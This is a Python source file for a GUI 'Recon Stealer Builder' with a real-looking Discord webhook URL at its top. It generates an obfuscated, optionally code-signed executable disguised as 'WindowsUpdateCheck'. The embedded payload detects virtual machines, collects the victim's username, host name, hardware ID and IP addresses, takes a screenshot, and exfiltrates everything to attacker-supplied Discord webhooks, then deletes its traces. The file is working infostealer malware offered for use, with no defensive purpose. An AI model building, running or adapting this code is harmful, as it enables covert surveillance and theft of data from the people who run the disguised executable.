https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO


import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import shutil
import tempfile
import textwrap
import requests

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in (200, 204):
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Recon Stealer Builder - Pyarmor Pack Final Fix")
    root.geometry("800x600")
    root.resizable(False, False)

    notebook = ttk.Notebook(root)
    notebook.pack(fill="both", expand=True, padx=10, pady=10)

    # Build Tab
    build_frame = ttk.Frame(notebook)
    notebook.add(build_frame, text="Build")

    ttk.Label(build_frame, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
    webhook_entry = ttk.Entry(build_frame, width=100)
    webhook_entry.pack(pady=5)

    ttk.Label(build_frame, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
    pfx_entry = ttk.Entry(build_frame, width=100)
    pfx_entry.pack(pady=5)

    ttk.Label(build_frame, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
    pass_entry = ttk.Entry(build_frame, width=100, show="*")
    pass_entry.pack(pady=5)

    ttk.Label(build_frame, text="Obfuscation Mode (use 0 if no paid license):", font=("Arial", 10, "bold")).pack(pady=10)
    mode_var = tk.IntVar(value=0)
    ttk.Radiobutton(build_frame, text="0 - Basic (free/trial - works for you)", variable=mode_var, value=0).pack()
    ttk.Radiobutton(build_frame, text="1 - Advanced (needs Basic+ license)", variable=mode_var, value=1).pack()
    ttk.Radiobutton(build_frame, text="2 - RFT Super (needs Pro license)", variable=mode_var, value=2).pack()

    def run_test():
        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
        if not hooks:
            messagebox.showerror("Nope", "Enter at least one webhook.")
            return
        results = []
        for h in hooks:
            success, msg = test_webhook(h)
            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
        messagebox.showinfo("Test Results", "\n".join(results))

    ttk.Button(build_frame, text="TEST WEBHOOKS", command=run_test).pack(pady=10)

    progress = ttk.Progressbar(build_frame, mode="indeterminate")

    def build():
        raw_hooks = webhook_entry.get().strip()
        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
            return
        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
        pfx_path = pfx_entry.get().strip()
        pfx_pass = pass_entry.get().strip() or None
        mode = mode_var.get()

        progress.pack(pady=15)
        progress.start()
        root.update()

        try:
            generate_malware(webhooks, pfx_path, pfx_pass, mode)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", "stealer.exe ready - no more module errors.\nUses pyarmor --pack onefile internally.\nScreenshot + recon + multi-exfil.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"{str(e)}")
        root.destroy()

    ttk.Button(build_frame, text="BUILD EXE", command=build).pack(pady=20)

    # Info Tab
    info_frame = ttk.Frame(notebook)
    notebook.add(info_frame, text="Info / Licenses")

    info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
    info_text.pack(padx=10, pady=10)

    license_info = textwrap.dedent('''
    PYARMOR LICENSE INFO (Dec 2025 - v9.x)

    You said no license â†’ use mode 0 (basic obfuscation - free).

    Higher modes need paid:
    - Basic license: ~$60, unlocks advanced/mix-str
    - Pro license: ~$100+, unlocks RFT (real protection)

    Buy: https://pyarmor.dashingsoft.com/cart/order.html
    Activate: Download .reg file after purchase â†’ double-click it.

    This builder uses pyarmor --pack onefile - handles all imports/runtime perfectly.
    ''')
    info_text.insert(tk.END, license_info)
    info_text.config(state=tk.DISABLED)

    root.mainloop()

# =================== STEALER CODE (unchanged solid payload) ===================
stealer_code = textwrap.dedent('''
import os
import sys
import time
import subprocess
import socket
import requests
import ctypes
import platform
import uuid
import winreg
import random
from datetime import datetime

try:
    import pyautogui
    HAS_PYAUTO = True
except:
    HAS_PYAUTO = False

def is_vm():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
        val = winreg.QueryValueEx(key, "0")[0].lower()
        if any(x in val for x in ["vmware", "vbox", "virtual", "qemu", "xen"]):
            return "Yes (Disk Enum)"
        winreg.CloseKey(key)
    except: pass

    try:
        if "VIRTUAL" in subprocess.check_output("systeminfo", shell=True, text=True).upper():
            return "Yes (SystemInfo)"
    except: pass

    try:
        if os.path.exists(r"C:\\windows\\System32\\drivers\\VBoxMouse.sys"):
            return "Yes (VBox Driver)"
    except: pass

    try:
        model = subprocess.check_output("wmic computersystem get model", text=True, shell=True).lower()
        if "vmware" in model or "virtual" in model:
            return "Yes (VMware/Virtual Model)"
    except: pass

    class MEM(ctypes.Structure):
        _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
    mem = MEM(); mem.dwLength = ctypes.sizeof(mem)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
    if mem.ullTotalPhys < 4 * 1024**3:
        return "Yes (Low RAM <4GB)"

    try:
        vm_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "xenservice.exe"]
        output = subprocess.check_output("tasklist", text=True)
        if any(p in output.lower() for p in vm_procs):
            return "Yes (VM Process)"
    except: pass

    return "No"

def get_public_ip():
    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
        try:
            return requests.get(url, timeout=5).text.strip()
        except:
            continue
    return "Failed"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Failed"

def get_hwid():
    try:
        return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
    except:
        return str(uuid.getnode())

def exfil(webhooks):
    time.sleep(random.uniform(5, 15))

    data = f"""
RECON REPORT - {datetime.utcnow().isoformat()} UTC
================================================
Username      : {os.getenv("USERNAME")}
Computer Name : {platform.node()}
OS            : {platform.system()} {platform.release()} ({platform.version()})
CPU           : {platform.processor()}
HWID          : {get_hwid()}
VM Detected   : {is_vm()}
Public IP     : {get_public_ip()}
Local IP      : {get_local_ip()}
"""

    files_to_send = {}
    temp_files = []

    recon_file = os.path.join(os.getenv("TEMP"), f"update_{random.randint(10000,99999)}.txt")
    with open(recon_file, "w", encoding="utf-8") as f:
        f.write(data)
    files_to_send["recon.txt"] = open(recon_file, "rb")
    temp_files.append(recon_file)

    if HAS_PYAUTO:
        try:
            screen_path = os.path.join(os.getenv("TEMP"), f"screen_{random.randint(10000,99999)}.png")
            pyautogui.screenshot(screen_path)
            files_to_send["screenshot.png"] = open(screen_path, "rb")
            temp_files.append(screen_path)
        except:
            pass

    for hook in webhooks:
        try:
            payload = {"content": f"**New recon hit** - {os.getenv('USERNAME')}@{platform.node()}"}
            resp = requests.post(hook, data=payload, files=files_to_send, timeout=20)
            if resp.status_code in (200, 204):
                break
        except:
            continue
    else:
        try:
            requests.post(webhooks[0], json={"content": f"Fallback recon (file send failed):\\n```\\n{data}\\n```"})
        except:
            pass

    for f in files_to_send.values():
        try: f.close()
        except: pass
    for p in temp_files:
        try: os.remove(p)
        except: pass

exfil({WEBHOOK_PLACEHOLDER})
''')

# =================== BUILD - pyarmor --pack onefile ===================
def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
    if not shutil.which("pyarmor"):
        raise Exception("pyarmor not installed - pip install pyarmor")

    temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
    script = os.path.join(temp_dir, "recon.py")
    hook_str = repr(webhooks)
    with open(script, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", hook_str))

    # pyarmor gen with --pack onefile
    gen_cmd = ["pyarmor", "gen"]
    if mode == 1:
        gen_cmd += ["--advanced", "2", "--mix-str"]
    elif mode == 2:
        gen_cmd += ["--enable-rft"]
    gen_cmd += ["--pack", "onefile", "--name", "WindowsUpdateCheck", "--clean", script]

    result = subprocess.run(gen_cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"Pyarmor pack failed (use mode 0 if no license):\n{result.stdout}\n{result.stderr}")

    bundled_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
    final = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(bundled_exe, final)

    # Signing
    if pfx_path and os.path.exists(pfx_path):
        sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256"]
        if pfx_pass:
            sign_cmd += ["/p", pfx_pass]
        sign_cmd += [final]
        sign_result = subprocess.run(sign_cmd, capture_output=True, text=True)
        if sign_result.returncode != 0:
            print(f"Signing failed:\n{sign_result.stderr}")
        else:
            print("Signed.")

    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Final stealer built: {final}")

if __name__ == "__main__":
    get_webhook()
